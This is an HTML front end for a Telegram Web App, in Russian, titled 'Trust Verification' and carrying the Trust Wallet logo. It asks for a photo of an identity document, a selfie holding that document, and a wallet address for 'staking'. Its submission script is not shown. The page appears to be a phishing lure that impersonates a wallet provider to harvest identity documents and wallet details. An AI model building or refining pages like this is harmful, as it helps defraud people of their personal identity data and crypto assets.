<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Trust Verification</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="app-container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Trust_Wallet_logo_%282026%29.png" 
                 alt="Trust Wallet Logo" 
                 class="logo">
            <h1>Верификация</h1>
        </div>
        
        <!-- Секция Верификации -->
        <div class="card">
            <div class="input-group">
                <label class="label">Документ, подтверждающий личность</label>
                <div class="file-upload-wrapper">
                    <input type="file" id="docInput" accept="image/*">
                    <div class="file-custom">Выбрать фото документа</div>
                </div>
            </div>

            <div class="input-group">
                <label class="label">Селфи с документом</label>
                <div class="file-upload-wrapper">
                    <input type="file" id="selfieInput" accept="image/*">
                    <div class="file-custom">Сделать селфи</div>
                </div>
            </div>

            <button id="verifyBtn" class="btn btn-primary">Подтвердить личность</button>
        </div>

        <!-- Секция Стейкинга -->
        <div class="card">
            <h3>Стейкинг</h3>
            <p class="hint">Введите адрес кошелька для подключения</p>
            <div class="input-group">
                <input type="text" id="walletInput" placeholder="Адрес кошелька (0x...)" class="text-input">
            </div>
            <button id="stakingBtn" class="btn btn-outline">Подключить стейкинг</button>
        </div>

        <div id="status" class="status-toast hidden"></div>
    </div>

    <script src="script.js"></script>
</body>
</html>
